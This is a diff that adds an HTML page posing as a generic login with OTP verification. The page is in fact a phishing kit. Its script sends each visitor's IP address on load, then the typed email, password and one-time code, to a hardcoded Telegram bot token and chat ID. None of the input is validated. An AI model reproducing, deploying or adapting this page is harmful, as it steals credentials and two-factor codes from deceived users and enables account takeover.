@@ -1,1 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login and OTP Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            width: 300px;
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input[type="email"], input[type="password"], input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0073aa;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005c99;
+        }
+        .help-links {
+            margin-top: 20px;
+        }
+        .help-links a {
+            text-decoration: none;
+            color: #0073aa;
+            font-size: 0.9rem;
+        }
+        .help-links a:not(:last-child) {
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="pic.svg" alt="Logo" class="logo"> 
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="Email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit">Log In</button>
+            <div class="help-links">
+                <a href="#">Having trouble logging in?</a>
+                <br>
+                <a href="#">Sign Up</a>
+            </div>
+        </form>
+    </div>
+    <script>
+        function sendTelegramMessage(chatId, text) {
+            var token = '6620305104:AAFCfGH0q9azZkxN3TDNqDTe0k_MehLnWA4';
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Message sent:', data))
+                .catch(error => console.error('Error sending message:', error));
+        }
+
+        // Fetch the user's IP address using ipify
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip; // Get the IP address from the response
+                sendTelegramMessage('774551599', `User online: IP Address - ${userIP}`);
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var loginInfo = `Login attempt - Email: ${email}, Password: ${password}`;
+
+            sendTelegramMessage('774551599', loginInfo);
+
+            // Proceed to OTP page
+            document.querySelector('.login-container').innerHTML = `
+                <h2>OTP Verification</h2>
+                <form id="otpForm">
+                    <div class="input-group">
+                        <input type="text" id="otp" name="otp" placeholder="Enter OTP" required>
+                    </div>
+                    <button type="submit">Verify OTP</button>
+                </form>
+            `;
+            document.getElementById('otpForm').addEventListener('submit', function(otpEvent) {
+                otpEvent.preventDefault();
+                var otp = document.getElementById('otp').value;
+                sendTelegramMessage('774551599', `OTP attempt: ${otp}`); // Send OTP attempt to Telegram
+                alert('Proceeding without validating OTP.'); // Notify the user of the non-validation
+                // Optionally redirect or show a success message
+            });
+        });
+    </script>
+</body>
+</html>
 
